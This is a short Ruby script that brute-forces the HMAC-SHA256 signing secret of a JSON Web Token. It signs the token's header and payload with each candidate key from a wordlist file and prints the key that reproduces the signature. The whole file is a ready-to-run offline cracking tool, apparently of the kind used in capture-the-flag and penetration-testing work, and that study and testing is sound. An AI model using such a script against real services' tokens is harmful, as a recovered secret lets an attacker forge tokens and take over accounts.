require 'base64'
require 'openssl'


jwt = "inputJWT" #change this

header, data, signature = jwt.split(".")

def sign(data, secret)
  Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new('sha256'), secret, data)).gsub("=","")
end
File.readlines("list.txt").each do |line|
  line.chomp!
  if sign(header+"."+data, line) == signature
    puts line
    exit
  end
end
